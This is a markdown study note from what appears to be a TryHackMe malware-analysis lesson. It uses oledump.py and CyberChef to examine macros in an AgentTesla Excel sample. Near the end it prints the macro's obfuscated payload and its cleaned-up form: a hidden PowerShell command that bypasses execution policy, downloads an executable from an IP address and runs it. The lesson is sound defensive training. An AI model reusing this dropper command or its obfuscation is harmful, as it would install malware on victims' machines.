# REMnux.md

## REMux is a Malware analysis based Linus ditstro that can be found here: https://remnux.org/

### From Cybersecurity101 on THM // 

In this task, we will use oledump.py to conduct static analysis on a potentially malicious Excel document. 

Oledump.py is a Python tool that analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format. 
OLE stands for Object Linking and Embedding, a proprietary technology developed by Microsoft. 
OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. 
This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

Let's start!
Using the virtual machine attached to task 2, the REMnux VM, navigate to the /home/ubuntu/Desktop/tasks/agenttesla/ directory. Our target file is named agenttesla.xlsm. 
Run the command oledump.py agenttesla.xlsm. See the terminal below.

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
 Based on OleDump's file analysis, a VBA script might be embedded in the document and found inside xl/vbaProject.bin. 
 Therefore, oledump will assign this with an index of A, though this can sometimes differ. The A (index) +Numbers are called data streams. 

Now, we should be aware of the data stream with the capital letter M. This means there is a Macro, and you might want to check out this data stream, 'VBA/ThisWorkbook'.

So, let's check it out! Let's run the command oledump.py agenttesla.xlsm -s 4. 
This command will run the oledump and look into the actual data stream of interest using the parameter -s 4,  wherein the -s parameter is short for -select  and the number four(4) as the data stream of interest is in the 4th place(A4: M 688 'VBA/ThisWorkbook')

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
View Results
The results above are in hex dump format. There might be some familiar words from a trained eye. 
However, this is still challenging for us, don't you think? So, let's make it more readable and easier to understand.

We will run an additional parameter --vbadecompress in addition to the previous command.
When we use this parameter, oledump will automatically decompress any compressed VBA macros it finds into a more readable format, making it easier to analyze the contents of the macros.

Terminal
ubuntu@MACHINE_IP:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
View Results
This is much better, isn't it?
 Now, we don't need to be able to read the whole script but rather familiarize ourselves with some characters and commands. 
 Our interest here would be the value of Sqtnew because if you check the script, there is a Public IP, a PDF, and a .exe inside. We might want to look into this further.

Terminal
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")

We will copy the first value of Sqtnew and paste it into CyberChef's input area. You can open a local copy of CyberChef inside the REMnux VM or go to this link to access the online version. 
Use whichever works for you. 
You might want to check our room about CyberChef to get more familiar with the tool.

Next, select the Find/Replace operation twice. 
Looking back at the script, the 2nd and 3rd values of Sqtnew have a command to replace * with "" and ^ with "". 
We would assume that the "" means there is no value. So, with our first operation selected, we put the value * and selected SIMPLE STRING as additional parameters. 
In contrast, we did not put anything on the Replace box or have any value.  
The same applies to our second operation: we put the value ^ and selected SIMPLE STRING, and the replace box has no value. See the image below.

CyberChef using Find/Replace twice to fix PowerShell script.

Now, this is more readable! However, for our starters, this can be challenging. So, we will tackle the most basic commands here.

Terminal
"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"
Let's break it down!

So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.
By default, PowerShell restricts script execution for security reasons. The -executionpolicy parameter allows you to override this policy. The bypass means that the execution policy is temporarily ignored, allowing any script to run without restriction.
The Invoke-WebRequest is commonly used for downloading files from the internet.
The -Uri Specifies the URL of the web resource you want to retrieve. In our case, the script is downloading the resource Doc-3737122pdf.exe from http://193.203.203.67/rt/.
The -OutFile specifies the local file where the downloaded content will be saved.  In this case, the Doc-3737122pdf.exe will be saved to $TempFile.
The Start-Process is used to execute the downloaded file that is stored in $TempFile after the web request.
To summarize, when the document agenttesla.xlsm is opened, a Macro will run! This Macro contains a VBA script. 
The script will run and will be running a PowerShell to download a file named Doc-3737122pdf.exe from http://193.203.203.67/rt/, save it to a variable $TempFile, then execute or start running the file inside this variable, which is a binary or a .exe file (Doc-3737122pdf.exe). This is a usual technique used by threat actors to avoid early detection. Pretty nasty, right?!


